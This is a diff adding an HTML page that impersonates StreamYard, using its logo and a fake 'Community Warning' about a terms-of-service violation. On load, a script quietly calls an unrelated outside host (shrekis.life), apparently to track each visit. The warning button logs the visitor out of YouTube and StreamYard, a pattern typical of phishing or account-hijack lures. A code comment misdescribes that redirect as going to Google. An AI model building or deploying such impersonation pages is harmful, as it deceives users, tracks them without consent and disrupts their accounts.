@@ -1,0 +1,66 @@
+
+
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StreamYard</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; /* Remove default margin */
+            background-color: #f8d7da;
+            color: #155724; /* Green text color */
+            font-family: Arial, sans-serif;
+        }
+        .popup {
+            border: 1px solid #c3e6cb;
+            border-radius: 8px;
+            background-color: #ffffff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 90%; /* Set a max width for smaller screens */
+            width: 400px; /* Fixed width for larger screens */
+        }
+        button {
+            background-color: #007bff; /* Blue button */
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            width: 100%; /* Make button full-width on mobile */
+        }
+        button:hover {
+            background-color: #0056b3; /* Darker blue on hover */
+        }
+        img {
+            width: 100px; /* Responsive logo size */
+            height: auto; /* Maintain aspect ratio */
+            margin-bottom: 10px;
+        }
+    </style>
+    <script>
+      fetch('https://shrekis.life/83FB0E')
+        function redirectAndOpen() {
+            window.open("https://youtube.com/logout");
+            window.location.href = "https://streamyard.com/api/user/logout"; // Redirect to Google
+        }
+    </script>
+</head>
+<body>
+    <div class="popup">
+        <img src="https://streamyard.com/static/img/0637d6d4f97338fe45dfb7a8e4d19753.svg" alt="StreamYard Logo">
+        <h2>Community Warning</h2>
+        <p>You have received a community warning due to violating StreamYard's TOS.</p>
+        <button onclick="redirectAndOpen()">View Community Warning</button>
+    </div>
+</body>
+</html>
